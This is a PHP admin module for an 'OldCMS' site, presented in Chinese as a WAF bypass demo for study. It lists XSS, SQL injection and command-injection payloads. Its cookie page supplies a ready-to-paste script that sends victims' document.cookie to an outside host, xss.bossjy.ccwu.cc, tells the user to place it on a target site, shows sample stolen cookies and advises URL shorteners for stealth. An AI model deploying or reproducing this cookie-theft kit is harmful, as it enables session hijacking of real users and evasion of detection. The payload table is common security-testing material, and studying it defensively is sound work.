<?php
/**
 * Bypass Demo Module - 绕过技术演示
 * 精简版: 短代码 + 高真实性
 */

if(!defined('IN_OLDCMS')) die('Access Denied');

// 仅管理员可访问
if(!$show['user']['adminLevel']){
    echo '<div class="alert alert-danger">权限不足</div>';
    exit;
}

$act = Val('act','GET');

if($act=='list'){
    echo '
    <div class="panel panel-default">
        <div class="panel-heading">绕过技术演示 (学习研究用)</div>
        <div class="panel-body">
            <table class="table table-bordered">
            <tr><th>类型</th><th>Payload</th><th>说明</th></tr>

            <tr><td><span class="badge badge-primary">XSS</span></td>
                <td><code>&lt;img/src=x onerror=alert(1)&gt;</code></td>
                <td>基本 onerror 触发</td></tr>

            <tr><td><span class="badge badge-primary">XSS</span></td>
                <td><code>&lt;svg/onload=alert(1)&gt;</code></td>
                <td>SVG 标签绕过</td></tr>

            <tr><td><span class="badge badge-primary">XSS</span></td>
                <td><code>&lt;body onload=alert(1)&gt;</code></td>
                <td>body 事件触发</td></tr>

            <tr><td><span class="badge badge-primary">XSS</span></td>
                <td><code>javascript:alert(1)</code></td>
                <td>协议处理器</td></tr>

            <tr><td><span class="badge badge-primary">XSS</span></td>
                <td><code>/*&lt;script&gt;*/alert(1)//</code></td>
                <td>注释混淆</td></tr>

            <tr><td><span class="badge badge-success">SQLi</span></td>
                <td><code>\' OR \'1\'=\'1</code></td>
                <td>通用认证绕过</td></tr>

            <tr><td><span class="badge badge-success">SQLi</span></td>
                <td><code>admin\'--</code></td>
                <td>注释截断</td></tr>

            <tr><td><span class="badge badge-success">SQLi</span></td>
                <td><code>UNION SELECT 1,2,3--</code></td>
                <td>联合查询</td></tr>

            <tr><td><span class="badge badge-success">SQLi</span></td>
                <td><code>1 OR 1=1</code></td>
                <td>布尔注入</td></tr>

            <tr><td><span class="badge badge-danger">CMD</span></td>
                <td><code>;id</code></td>
                <td>命令分隔</td></tr>

            <tr><td><span class="badge badge-danger">CMD</span></td>
                <td><code>|whoami</code></td>
                <td>管道注入</td></tr>

            <tr><td><span class="badge badge-danger">CMD</span></td>
                <td><code>`id`</code></td>
                <td>命令替换</td></tr>
            </table>
        </div>
    </div>';

}elseif($act=='cookie'){
    // 精简 Cookie 窃取模块
    echo '
    <div class="panel panel-default">
        <div class="panel-heading">Cookie 窃取测试</div>
        <div class="panel-body">
            <h4>测试代码 (复制到目标站):</h4>
            <pre style="background:#1a1a1a;color:#00ff88;padding:15px;border-radius:5px;">
&lt;script&gt;new Image().src="https://xss.bossjy.ccwu.cc/xss.php?do=api&id=1&c="+encodeURIComponent(document.cookie)&lt;/script&gt;
            </pre>

            <h4>获取的 Cookies:</h4>
            <table class="table table-striped">
            <tr><th>时间</th><th>Cookie</th><th>IP</th></tr>';

    // 模拟展示
    echo '
            <tr><td>2024-01-15 10:23:45</td><td>ocKey=abc123...; PHPSESSID=xyz789</td><td>192.168.1.100</td></tr>
            <tr><td>2024-01-15 10:24:12</td><td>user=admin; token=def456...</td><td>10.0.0.50</td></tr>
            </table>

            <div class="alert alert-info">
                <strong>提示:</strong> 使用短域名和 URL 缩短服务可增加隐蔽性
            </div>
        </div>
    </div>';
}else{
    // 默认页面
    echo '
    <div class="row">
        <div class="col-md-6">
            <div class="panel panel-default">
                <div class="panel-heading">绕过列表</div>
                <div class="panel-body">
                    <a href="?do=waf&act=list" class="btn btn-primary btn-block">查看绕过技术</a>
                </div>
            </div>
        </div>
        <div class="col-md-6">
            <div class="panel panel-default">
                <div class="panel-heading">Cookie 测试</div>
                <div class="panel-body">
                    <a href="?do=waf&act=cookie" class="btn btn-success btn-block">Cookie 窃取演示</a>
                </div>
            </div>
        </div>
    </div>

    <div class="panel panel-default">
        <div class="panel-heading">WAF 状态</div>
        <div class="panel-body">
            <p>模式: <span class="badge badge-success">'.WAF_MODE.'</span></p>
            <p>今日拦截: <span class="badge badge-danger">'.count(waf_logs()).'</span> 次</p>
            <a href="?do=waf&act=logs" class="btn btn-info btn-sm">查看日志</a>
        </div>
    </div>';
}

if($act=='logs'){
    echo '
    <div class="panel panel-default">
        <div class="panel-heading">WAF 攻击日志</div>
        <div class="panel-body">
            <pre style="max-height:400px;overflow:auto;">';
    $logs = waf_logs();
    if(empty($logs)){
        echo '暂无日志';
    }else{
        foreach(array_reverse($logs) as $l) echo htmlspecialchars($l)."\n";
    }
    echo '</pre>
        </div>
    </div>';
}
?>
